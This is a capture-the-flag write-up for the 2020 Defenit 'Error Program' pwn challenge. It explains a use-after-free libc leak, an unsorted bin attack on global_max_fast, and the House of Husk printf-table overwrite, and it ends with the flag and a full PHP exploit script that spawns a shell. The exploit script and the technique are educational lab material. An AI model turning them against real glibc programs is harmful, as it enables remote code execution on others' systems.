# Error Program - 2020 Defenit CTF (pwn, 298p, 35 solved)
## Introduction

Error Program is a pwn task.

A binary, and a libc are provided.

The binary presents a menu with 3 options : buffer overflow, format string and
use-after-free.

The libc provided is `Ubuntu GLIBC 2.27-3ubuntu1`.

## Reverse engineering

The buffer-overflow menu lets the user read `0x108` bytes in a buffer of size
`0x100`. It can only overwrite a canary, preventing the feature from being
exploited.

The format string menu lets the user input a string, and call `printf` on it,
resulting in a format string vulnerability.
The function checks that the input does not contain `%` and `$`. These checks
prevent the feature from being exploited.

The use-after-free menu provides an other menu that lets the user create,
delete, edit, and view memory chunks.

The menu keeps track of the allocated chunks in a global array that can hold up
to 4 pointers.

`Malloc` will create a chunk of size between `0x777` and `0x77777`. It cannot
allocate two chunks with the same index. It effectively limits the total number
of allocated chunks to 4.

`Free` will free a chunk without removing its pointer from the global array.

`Edit` will overwrite a chunk with up to `0x777` bytes of user input. Given that
chunks must have a size of at least `0x777` bytes, this prevents heap overflows.

`View` will print the first `0x10` bytes of a chunk.

## Exploitation

### Libc leak

With the primitives given by the program, it is possible to leak a pointer to
the libc by doing the following actions :
1. allocate chunk 1 of any size
2. allocate chunk 2 of any size ; it will protect chunk 1 from top chunk
3. free chunk 1
4. view chunk 1 ; the 0x10 bytes will contact `fd` and `bk` pointing to
   `main_arena`.

```
********** UAF MENU ***********
1 : MALLOC
2 : FREE
3 : EDIT
4 : VIEW
5 : RETURN
*******************************
YOUR CHOICE? : 1
INDEX? : 1
SIZE? : 4096
ALLOCATE FINISH.

[...]
YOUR CHOICE? : 1
INDEX? : 2
SIZE? : 4096
ALLOCATE FINISH.

[...]
YOUR CHOICE? : 2
INDEX? : 1
FREE FINISH.

[...]
YOUR CHOICE? : 4
INDEX? : 1
DATA :  pío pío
```

### Unsorted bin attack

This setup is also favorable to `unsorted bin attack` : overwrite `bk` and the
next allocation will write a pointer to `bk + 0x10`.

The go-to target for this attack is to overwrite `global_max_fast`. This global
variable is set with `mallopt` with `param = M_MXFAST`. This lets a developper
change the upper limit of fastbins size.

If this variable is big enough, almost every freed chunk will be added to the
`main_arena.fastbinsY` array, allowing one to overwrite global variables
with pointers to freed chunks.

`ptr-yudai` wrote a good article about a relatively new exploit technique they
called [`House of Husk`](https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507).

The libc used for the challenge is the same as the one used in the article. The
offsets can be reused as-is.

```
% ./ld-2.27.so --library-path . ./husk
libc @ 0x66156ef99000
sh-5.0$ 
```
House of Husk requires a call to `printf` with a formatting argument. When the
canary of the buffer overflow menu is invalid, the program will call
`printf("%x", canary);`. This can be used to execute the one gadget.


**Flag**: `Defenit{1ntend:H0us3_0f_!@#$_and_us3_scanf}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php // vim: filetype=php
const HOST = "error-program.ctf.defenit.kr";
const PORT = 7777;

/* https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507 */
const MAIN_ARENA       = 0x3ebc40;
const MAIN_ARENA_DELTA = 0x60;
const GLOBAL_MAX_FAST  = 0x3ed940;
const PRINTF_FUNCTABLE = 0x3f0658;
const PRINTF_ARGINFO   = 0x3ec870;
const ONE_GADGET       = 0x10a38c;

function menu(Tube $t)
{
	$t->expectLine("");
	$t->expectLine("********** UAF MENU ***********");
	$t->expectLine("1 : MALLOC");
	$t->expectLine("2 : FREE");
	$t->expectLine("3 : EDIT");
	$t->expectLine("4 : VIEW");
	$t->expectLine("5 : RETURN");
	$t->expectLine("*******************************");
	$t->expect("YOUR CHOICE? : ");
}

function allocate(Tube $t, $index, $size)
{
	menu($t);
	$t->write("1\n");

	$t->expect("INDEX? : ");
	$t->write("$index\n");

	$t->expect("SIZE? : ");
	$t->write("$size\n");

	$t->expectLine("ALLOCATE FINISH.");
}

function free(Tube $t, $index)
{
	menu($t);
	$t->write("2\n");

	$t->expect("INDEX? : ");
	$t->write("$index\n");

	$t->expectLine("FREE FINISH.");
}

function edit(Tube $t, $index, $data)
{
	menu($t);
	$t->write("3\n");

	$t->expect("INDEX? : ");
	$t->write("$index\n");

	$t->expect("DATA : ");
	$t->write($data);

	$t->expect("EDIT FINISH.");
}


function view(Tube $t, $index)
{
	menu($t);
	$t->write("4\n");

	$t->expect("INDEX? : ");
	$t->write("$index\n");

	$t->expect("DATA : ");
	return $t->read(0x10);
}

printf("[*] Creating process\n");
$time = microtime(true);
$t = new Socket(HOST, PORT);

$t->expectLine("");
$t->expectLine("******* INPUT YOUR ERROR ******");
$t->expectLine("1 : Buffer OverFlow");
$t->expectLine("2 : Format String Bug");
$t->expectLine("3 : Using After Free");
$t->expectLine("4 : RETURN");
$t->expectLine("*******************************");
$t->expect("YOUR CHOICE? : ");
$t->write("3\n");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

printf("[*] Allocate chunks\n");
allocate($t, 0, 0x800 - 8);
allocate($t, 1, 2 * (PRINTF_FUNCTABLE - MAIN_ARENA) - 0x10);
allocate($t, 2, 2 * (PRINTF_ARGINFO   - MAIN_ARENA) - 0x10);


printf("[*] Leak libc\n");
free($t, 0);

$leak = view($t, 0);
$addr = unpack("Q*", $leak);
$libc = $addr[1] - 0x6f3a0a818ca0 + 0x6f3a0a42d000;
printf("[+] libc: %X\n", $libc);

printf("[*] House of husk\n");
edit($t, 2, str_repeat(pack("Q", $libc + ONE_GADGET), ord("x")));
edit($t, 0, pack("Q*", 0, $libc + GLOBAL_MAX_FAST - 0x10));
allocate($t, 3, 0x800 - 8);

free($t, 1);
free($t, 2);

printf("[*] Call printf\n");
menu($t);
$t->write("5\n");

$t->expectLine("");
$t->expectLine("******* INPUT YOUR ERROR ******");
$t->expectLine("1 : Buffer OverFlow");
$t->expectLine("2 : Format String Bug");
$t->expectLine("3 : Using After Free");
$t->expectLine("4 : RETURN");
$t->expectLine("*******************************");
$t->expect("YOUR CHOICE? : ");
$t->write("1\n");

$t->expect("Input your payload : ");
$t->write(str_repeat("A", 0x108));

$t->pipe();
```
